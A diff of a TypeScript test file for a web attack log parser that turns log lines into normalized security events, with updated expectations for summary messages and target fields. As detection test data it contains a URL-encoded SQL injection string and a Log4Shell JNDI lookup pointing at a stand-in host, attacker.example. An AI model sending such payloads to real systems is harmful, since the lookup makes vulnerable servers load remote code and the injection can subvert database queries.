@@ -41,7 +41,11 @@ describe("WebAttackLogParser", () => {
     expect(event.severityName).toBe(OcsfSeverity.Medium);
     expect(event.principalIp).toBe("203.0.113.40");
     expect(event.targetResource).toBe("/item?id=1%27%20or%201%3D1");
-    expect(event.message).toBe(WEB_LINES.sqlInjectionEncoded);
+    // A one-line summary of the attack and the answer, not the raw line.
+    expect(event.message).toBe(
+      "SQL injection attempt: GET /item?id=1%27%20or%201%3D1 → 200",
+    );
+    expect(event.requestOutcome).toBe("Reached App");
     expect(event.productName).toBe("Web server");
     expect(event.attributes["web.attack.kind"]).toBe(
       WebAttackKind.SqlInjection,
@@ -83,13 +87,19 @@ describe("WebAttackLogParser", () => {
     );
   });
 
-  test("a JNDI lookup in an application's own log keeps the whole line and finds the address", () => {
+  test("a JNDI lookup in an application's own log keeps the word that carries it and finds the address", () => {
     const event: NormalizedSecurityEvent = parseOne(
       WEB_LINES.log4ShellInApplicationLog,
     );
 
     expect(event.principalIp).toBe("203.0.113.44");
-    expect(event.targetResource).toBe(WEB_LINES.log4ShellInApplicationLog);
+    // The rules still find the lookup in the target; a person reads it, not the line.
+    expect(event.targetResource).toBe(
+      "X-Api-Version=${jndi:ldap://attacker.example/x}",
+    );
+    expect(event.message).toBe(
+      "Log4Shell exploit attempt: X-Api-Version=${jndi:ldap://attacker.example/x}",
+    );
     expect(event.activityName).toBe("");
     expect(event.statusName).toBe("");
   });
